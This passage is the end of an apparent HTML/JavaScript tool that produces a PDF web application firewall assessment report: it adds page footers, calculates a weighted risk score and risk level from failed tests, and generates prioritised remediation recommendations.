        doc.setPage(i);
        doc.setFontSize(8);
        doc.setTextColor(150, 150, 150);
        doc.text(`Page ${i} of ${pageCount}`, 105, 285, { align: 'center' });
        doc.text('WAF Security Assessment Report - Confidential', 105, 290, { align: 'center' });
    }
}

// Helper Functions
function calculateRiskScore(data) {
    const weights = {
        critical: 10,
        high: 5,
        medium: 2,
        low: 1
    };
    
    let score = 0;
    let maxScore = 0;
    
    Object.entries(weights).forEach(([severity, weight]) => {
        const stats = data.statistics[severity];
        score += stats.failed * weight;
        maxScore += stats.total * weight;
    });
    
    return maxScore > 0 ? Math.round((score / maxScore) * 100) : 0;
}

function getRiskLevel(score) {
    if (score >= 75) return 'CRITICAL';
    if (score >= 50) return 'HIGH';
    if (score >= 25) return 'MEDIUM';
    return 'LOW';
}

function generateRecommendations(data) {
    const recommendations = [];
    
    // Critical recommendations
    if (data.statistics.critical.failed > 0) {
        recommendations.push({
            priority: 'IMMEDIATE',
            title: 'Address Critical Security Failures',
            description: `${data.statistics.critical.failed} critical security tests failed. These represent severe vulnerabilities that could lead to immediate system compromise.`,
            actions: [
                'Review and remediate all critical failures immediately',
                'Implement emergency patches or configuration changes',
                'Consider temporary mitigation measures while permanent fixes are deployed',
                'Conduct immediate retesting after remediation'
            ]
        });
    }
    
    // High severity recommendations
    if (data.statistics.high.failed > 0) {
        recommendations.push({
            priority: 'HIGH',
            title: 'Remediate High Severity Issues',
            description: `${data.statistics.high.failed} high severity tests failed. These vulnerabilities pose significant risk and should be addressed promptly.`,
            actions: [
                'Prioritize remediation of high severity findings',
                'Review WAF rule configurations for gaps',
                'Implement additional security controls where needed',
                'Schedule follow-up testing within 30 days'
            ]
        });
    }
    
    // Configuration recommendations
    const configIssues = data.testDetails.filter(td => 
        td.overallStatus === 'failed' && 
        (td.test.name.includes('Header') || td.test.name.includes('Parameter'))
    );
    
    if (configIssues.length > 0) {
        recommendations.push({
            priority: 'MEDIUM',
            title: 'Strengthen Input Validation Rules',
            description: 'Multiple input validation tests failed, indicating gaps in request filtering and validation.',
            actions: [
                'Review and tighten header validation rules',
                'Implement stricter parameter validation',
                'Enable comprehensive input encoding checks',
                'Consider implementing positive security model'
            ]
        });
    }
    
    // Incomplete testing
    if (data.statistics.pending > 0) {
        recommendations.push({
            priority: 'MEDIUM',
            title: 'Complete Security Assessment',
            description: `${data.statistics.pending} test scenarios are still pending. Complete testing is required for comprehensive security assessment.`,
            actions: [
                'Schedule completion of remaining tests',
                'Allocate resources for comprehensive testing',
                'Document any tests that cannot be completed and reasons',
                'Plan for regular security assessment cycles'
            ]
        });
    }
    
    // General recommendations
    recommendations.push({
        priority: 'LOW',
        title: 'Implement Continuous Security Monitoring',
        description: 'Establish ongoing security testing and monitoring processes to maintain security posture.',
        actions: [
            'Implement automated security testing in CI/CD pipeline',
            'Schedule quarterly WAF configuration reviews',
            'Enable comprehensive logging and monitoring',
            'Maintain updated threat intelligence feeds'
        ]
    });
    
    return recommendations;
}
</script>
</body>
</html>